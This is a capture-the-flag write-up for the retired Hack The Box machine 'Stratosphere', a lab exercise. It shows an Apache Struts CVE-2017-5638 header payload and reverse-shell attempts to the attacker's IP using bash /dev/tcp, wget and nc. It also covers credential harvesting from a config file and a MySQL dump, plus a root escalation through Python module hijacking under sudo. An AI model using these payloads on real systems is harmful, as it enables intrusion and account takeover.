# Stratosphere

This is the write-up for the box Stratosphere that got retired at the 1st September 2018.
My IP address was 10.10.14.34 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.64    stratosphere.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/stratosphere.nmap 10.10.10.64
```

```markdown
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

## Checking HTTP (Port 80)

The web page is a company website with nothing interesting on it and in the HTML source.
Lets search for hidden directories with **Gobuster**:
```markdown
gobuster -u http://10.10.10.64 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It finds the following directories:
- /manager
  - Login prompt for _Tomcat Manager Application_
- /Monitoring
  - Forwards to _/Monitoring/example/Welcome.action_ and there is a button to _"Sign On"_ or _"Register"_.

![Monitoring page](https://kyuu-ji.github.io/htb-write-up/stratosphere/stratosphere_web-1.png)

The button _Register_ forwards to _/Monitoring/example/Register.action_ but there is only on sentence that it is under construction.
The button _Sign On_ forwards to _/Monitoring/example/Login_input.action_ where it is possible to input an username and a password.

![Sign on page](https://kyuu-ji.github.io/htb-write-up/stratosphere/stratosphere_web-2.png)

This _.action_ extension is mostly used in [Apache Struts](https://struts.apache.org/core-developers/action-configuration.html) and are used to determine how to process requests.

### Enumerating and exploiting Apache Struts

In an [article from Qualys](https://blog.qualys.com/securitylabs/2017/03/14/apache-struts-cve-2017-5638-vulnerability-and-the-qualys-solution) they describe what kind of request to send to the server to see if it is vulnerable.
```markdown
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Qualys-Struts',3195*5088)}.multipart/form-data
```

If we send this, the box will execute the math and response with the result of it in the header:
```markdown
# Request
GET /Monitoring/example/Welcome.action HTTP/1.1
Host: 10.10.10.64
(...)
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('Test',**3195*5088**)}.multipart/form-data

# Response
HTTP/1.1 200
**Test: 16256160**
Content-Type: text/html;charset=UTF-8
```

It seems like the box is vulnerable and as stated in the article, lets see if we can use **CVE-2017-5638**.
There is an exploit script called [struts-pwn on Github](https://github.com/mazen160/struts-pwn):
```markdown
python3 struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c id
```

This executes the `id` command and displays the output, which means we have command execution:
```markdown
uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)
```

Testing network connection and trying to start a reverse shell:
```markdown
python3 struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c "bash -i >& /dev/tcp/10.10.14.34/9001 0>&1"

python3 struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c "wget http://10.10.14.34/"

python3 struts-pwn.py -u http://10.10.10.64/Monitoring/example/Welcome.action -c "nc -u 10.10.14.34 53"
```

Every connection get closed immediately, so there is probably a firewall in the way.
In this case I will use a script to connect to the box with a web shell via HTTP request without callbacks to my local client. The script can be found in this repository.
```markdown
python3 stratosphere_webshell.py
```

This will use the exploit from **struts-pwn** and start a shell session as the user _tomcat8_.

## Privilege Escalation

As we are in the _/var/lib/tomcat8_ directory we can search for passwords in the configuration files.
In _/var/lib/tomcat8/db_connect_ there are two credentials:
```markdown
[ssn]
user=ssn_admin
pass=AWs64@on*&

[users]       
user=admin
pass=admin
```

As the file is called _db_connect_ lets use the credentials on **MySQL**:
```markdown
mysql -h localhost -u ssn_admin -p

mysql -h localhost -u admin -p
```

Both credentials work but _ssn_admin_ does not have access to any interesting databases while _admin_ has:
```markdown
show databases;
use users;
show tables;
select * from accounts;
```
```markdown
+------------------+---------------------------+----------+
| fullName         | password                  | username |
+------------------+---------------------------+----------+
| Richard F. Smith | 9tc*rhKuG5TyXvUJOrE^5CK7k | richard  |
+------------------+---------------------------+----------+
```

In the _/etc/passwd_ there is a _richard_ user, so we can SSH into the server:
```markdown
ssh richard@10.10.10.64
```

### Privilege Escalation to root

The home directory of _richard_ has a Python script named _test.py_ of which root is the owner of and can write to it:
```markdown
-rwxr-x--- 1 root    richard 1507 Mar 19  2018 test.py
```

The script looks like a hash cracking challenge with different hash types to crack and when successful, execute _/root/success.py_ which we don't know what it does. The hash types are in this order to crack:
> MD5, SHA1, MD4, BLAKE512

As the hash type _BLAKE512_ is secure and a very long string, cracking it will take way too long.
This challenge is not meant to be done this way.

When looking at the `sudo` privileges of _richard_, it shows that he can run this script as sudo:
```markdown
sudo -l

# Output
User richard may run the following commands on stratosphere:
    (ALL) NOPASSWD: /usr/bin/python* /home/richard/test.py
```

The script loads one module in the beginning:
```markdown
import hashlib

(...)
```

By loading this module from the current working directory and running the script with sudo privileges, we can abuse this script to run any command as root.

Creating _hashlib.py_ in _/home/richard_ with the following contents to execute `bash`:
```python
import os

os.system("/bin/bash")
```

Running _test.py_ with `sudo`:
```markdown
sudo python /home/richard/test.py
```

Now it loads _hashlib.py_ from the current directory, runs the code and starts a shell as root!
